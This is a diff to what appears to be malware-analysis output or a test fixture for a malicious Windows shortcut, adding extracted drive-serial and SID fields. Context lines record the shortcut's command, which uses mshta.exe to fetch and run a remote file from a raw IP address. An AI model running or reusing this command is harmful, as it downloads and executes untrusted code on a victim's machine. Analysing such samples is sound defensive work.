@@ -97,11 +97,17 @@
               "command_line": [
                 "C:\\Windows\\System32\\mshta.exe http://194.180.174.158/18.01/quicker.rtf"
               ],
+              "drive_serial": [
+                "5A8C5E7D"
+              ],
               "icon_location": [
                 "C:\\Program Files (x86)\\quicker.EXE"
               ],
               "machine_id": [
                 "desktop-farl139"
+              ],
+              "sid": [
+                "S-1-5-21-2666490403-3740712084-1197891756-1001"
               ],
               "tracker_mac": [
                 "08:00:27:2E:05:1D"
@@ -243,6 +249,13 @@
           "value": "C:\\Windows\\System32\\mshta.exe http://194.180.174.158/18.01/quicker.rtf"
         }
       ],
+      "file.shortcut.drive_serial": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "5A8C5E7D"
+        }
+      ],
       "file.shortcut.icon_location": [
         {
           "heur_id": null,
@@ -255,6 +268,13 @@
           "heur_id": null,
           "signatures": [],
           "value": "desktop-farl139"
+        }
+      ],
+      "file.shortcut.sid": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "S-1-5-21-2666490403-3740712084-1197891756-1001"
         }
       ],
       "file.shortcut.tracker_mac": [
